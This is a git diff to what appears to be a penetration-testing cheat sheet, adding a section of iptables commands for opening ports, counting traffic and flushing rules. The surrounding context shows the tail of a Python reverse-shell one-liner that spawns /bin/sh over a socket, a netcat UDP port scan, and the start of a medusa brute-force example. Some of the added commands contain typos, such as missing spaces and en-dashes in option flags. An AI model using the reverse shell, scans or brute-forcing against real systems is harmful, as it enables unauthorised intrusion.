@@ -82,6 +82,19 @@ os.dup2(s.fileno(),2)p=subprocess.call(["/bin/sh","-i"])
 -   UDP port scan: nc –nvv -u -z <your_ip_address> 3000-4000
 
 
+## Iptables
+
+-   Allow input on port: iptables -A INPUT -p tcp --dport [port] -j ACCEPT
+-   iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+-   iptables -A INPUT -p udp--dport 22 -j ACCEPT
+-   Traffic analysis
+    -   iptables -I INPUT 1 -s [your_ip_address]-j ACCEPT
+    -   iptables -I OUTPUT 1 -s [your_ip_address]-j ACCEPT
+    -   iptables –Z
+    -   iptables –vn -L
+
+-   Clean up rules: iptables -F INPUT
+
 medusa example
 ```shell
 medusa \
